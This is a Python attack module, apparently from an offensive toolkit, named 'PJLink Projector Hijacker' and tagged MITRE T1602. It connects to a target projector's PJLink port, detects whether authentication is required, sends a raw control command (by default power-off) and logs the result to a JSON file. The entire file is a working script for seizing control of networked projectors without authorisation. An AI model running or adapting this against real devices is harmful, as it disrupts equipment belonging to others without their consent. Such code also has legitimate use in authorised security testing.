# modules/attacks/pjlink_projector_hijack.py

import socket
import argparse
import time
from datetime import datetime
import json
import os

LOG_FILE = "results/projector_hijack_log.json"
MITRE_TTP = "T1602"

def log_event(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(data, f, indent=2)

def pjlink_command(ip, cmd, port=4352):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, port))
        banner = s.recv(128).decode()

        if "PJLINK" not in banner:
            print(f"[!] Not a PJLink device: {banner}")
            return False

        auth = "none"
        if "random" in banner:
            auth = "required"

        print(f"[+] PJLink banner: {banner.strip()} (auth: {auth})")

        s.send(cmd.encode())
        time.sleep(0.5)
        resp = s.recv(512).decode()
        print(f"[+] Response: {resp.strip()}")

        log_event({
            "timestamp": datetime.utcnow().isoformat(),
            "target": ip,
            "command": cmd.strip(),
            "response": resp.strip(),
            "auth_required": auth == "required",
            "ttp": MITRE_TTP
        })
        return True
    except Exception as e:
        print(f"[!] Error: {e}")
        return False
    finally:
        try:
            s.close()
        except:
            pass

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="PJLink Projector Hijacker")
    parser.add_argument("--ip", required=True, help="Target projector IP")
    parser.add_argument("--cmd", default="%1POWR 0\r", help="PJLink raw command (default: power off)")
    args = parser.parse_args()

    pjlink_command(args.ip, args.cmd)
